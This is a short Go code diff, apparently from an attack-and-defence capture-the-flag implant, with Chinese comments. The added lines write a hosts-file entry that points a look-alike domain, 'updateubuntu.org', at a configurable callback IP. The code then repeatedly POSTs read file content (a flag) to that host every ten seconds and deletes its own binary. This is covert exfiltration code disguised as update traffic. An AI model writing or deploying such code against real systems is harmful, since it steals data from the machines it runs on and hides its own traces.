@@ -38,6 +38,14 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
+	//设置回传主机
+	serverip := "192.168.8.100" //自己改
+	//写入HOSTS
+	hosts := serverip + " " + "updateubuntu.org" + "\n"
+	err = ioutil.WriteFile("/var/www/hosts", []byte(hosts), 0644)
+	if err != nil {
+		panic(err)
+	}
 	// 删除binary
 	absPath, err1 := os.Executable()
 	err2 := os.Remove(absPath)
@@ -153,14 +161,14 @@ func PostFlag() {
 		}
 
 		// 发送POST请求
-		_, err = http.Post("http://172.22.98.123:2333/received", "text/plain", bytes.NewReader([]byte(fmt.Sprintf("yyz-is-so-cute%s", content))))
+		_, err = http.Post("https://updateubuntu.org:2333/received", "text/plain", bytes.NewReader([]byte(fmt.Sprintf("yyz-is-so-cute%s", content))))
 		if err != nil {
 			fmt.Printf("post err：%v\n", err)
 		} else {
 			fmt.Println("good boy!")
 		}
 
-		time.Sleep(time.Second) // 每分钟执行一次
+		time.Sleep(10 * time.Second) // 每分钟执行一次
 	}
 }
 
